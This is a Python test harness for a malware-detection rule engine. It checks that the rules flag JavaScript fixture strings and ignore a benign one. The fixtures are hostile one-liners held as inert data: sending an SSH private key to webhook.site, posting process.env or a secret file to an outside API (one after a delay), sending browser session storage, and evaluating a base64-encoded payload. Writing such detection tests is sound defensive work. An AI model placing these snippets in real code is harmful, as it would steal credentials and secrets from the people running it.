"""Inert detection fixtures: these strings are scanned, never evaluated."""
import argparse,sys,importlib.util,tempfile,json,hashlib,tarfile,io
from pathlib import Path
p=argparse.ArgumentParser();p.add_argument('--tooling',type=Path,required=True);a=p.parse_args()
spec=importlib.util.spec_from_file_location('audit_scanner',Path(__file__).with_name('scan.py'));mod=importlib.util.module_from_spec(spec);spec.loader.exec_module(mod)
yara,rules,identity,count=mod.load_engine(a.tooling.resolve())
fixtures={
 'credential_exfil':(b"const fs=require('fs');fetch('https://webhook.site/example',{method:'POST',body:fs.readFileSync('/home/user/.ssh/id_rsa')});",['capability_network_outbound','threat_network_exfiltration']),
 'environment_exfil':(b"fetch('https://api.openai.com/v1/responses',{method:'POST',body:JSON.stringify(process.env)});",['threat_runtime_environment_read','capability_network_outbound']),
 'delayed_file_send':(b"setTimeout(()=>fetch('https://api.openai.com/v1/responses',{body:fs.readFileSync('/tmp/secret')}),86400000);",['audit_delayed_sensitive_activity']),
 'browser_session_collection':(b"fetch('/api/log',{method:'POST',body:localStorage.getItem('session')});",['audit_browser_collection']),
 'encoded_payload':(b"eval(Buffer.from('Y29uc29sZS5sb2coMSk=','base64').toString());",['threat_runtime_obfuscation_base64exec']),
 'benign_math':(b"export const square = (x) => x*x;",[]),
}
results=[]
for name,(body,expected) in fixtures.items():
 ids={r.identifier for r in rules.scan(body).matching_rules}
 missing=set(expected)-ids
 if missing:raise AssertionError((name,missing,ids))
 if name=='benign_math':assert not ids,ids
 results.append({'test':name,'passed':True,'rules':sorted(ids)})
print(json.dumps({'ruleCount':count,'fixtures':results,'targetExecution':False}))
